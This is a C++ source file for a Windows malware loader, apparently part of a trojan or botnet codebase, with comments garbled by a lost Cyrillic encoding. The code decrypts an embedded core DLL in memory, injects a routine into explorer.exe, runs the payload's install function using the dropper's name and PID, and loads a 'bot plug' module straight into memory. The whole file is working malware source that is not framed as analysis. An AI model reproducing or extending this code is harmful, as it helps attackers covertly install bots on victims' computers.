#include <windows.h>

#pragma comment(linker, "/ENTRY:LoaderMain" )

#include "Source\MemoryDllLoader.h"
#include "Source\MemoryDLL.h"
#include "Source\LoaderUtils.h"

#include "CoreDllDef.h"



char  DropperName[MAX_PATH];  // ��� ��� ����������� �����
DWORD DropperPID = 0; // PID ������� ����


//  ���������� DLL ����
namespace CoreDll
{
	#include "CoreDllData.cpp"	
}



//---------------------------------------------------------------------
//  ������� ��������� ������
//---------------------------------------------------------------------
void StartBotPlug(LPVOID Buf)
{
	LPVOID Handle = MemoryLoadLibrary(Buf);
	if (Handle)
	{
		OutputDebugStringA("-------------------------------------������ �������");
	}
}




//---------------------------------------------------------------------
//  ������� �������� �������
//---------------------------------------------------------------------
DWORD WINAPI ExplorerMainProc(LPVOID)
{
	// ��������� dll 
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);

	// ���� ������. ����������� ���
	TInstall Install = (TInstall)MemoryGetProcAddress(Handle, COREDLL_INSTALL);
	if (Install)
	{
		Install(DropperName, FALSE, TRUE, DropperPID); 
	}
	
	// ��������� ������
	TLoadBotPlug LoadBP = (TLoadBotPlug)MemoryGetProcAddress(Handle, COREDLL_LOADBOTPLUG);
	TFreeBotPlug FreeBP = (TFreeBotPlug)MemoryGetProcAddress(Handle, COREDLL_FREEBOTPLUG);

	LPVOID PlugBuf;
	DWORD  Size;
	if (LoadBP  && LoadBP(&PlugBuf, &Size))
	{
		StartBotPlug(PlugBuf);

		if (FreeBP) FreeBP(PlugBuf);
	}



	// ��������� ��� ����
	MemoryFreeLibrary(Handle);

	return 0;
}




//---------------------------------------------------------------------
//  �������� ������� txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	// �������� ��� �������
	DropperPID = GetCurrentProcessId();
	GetModuleFileNameA(NULL, DropperName, MAX_PATH);


	// ��������� ���������� 
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);

	LPVOID Proc = MemoryGetProcAddress(Handle, COREDLL_INJECTINTOEXPLORER);

	// ��������� � explorer.exe
	if (Proc)
		(TInjectIntoExplorer(Proc))(ExplorerMainProc);
	

	MemoryFreeLibrary(Handle);


	ExitProcess(0);
	return 0;
}



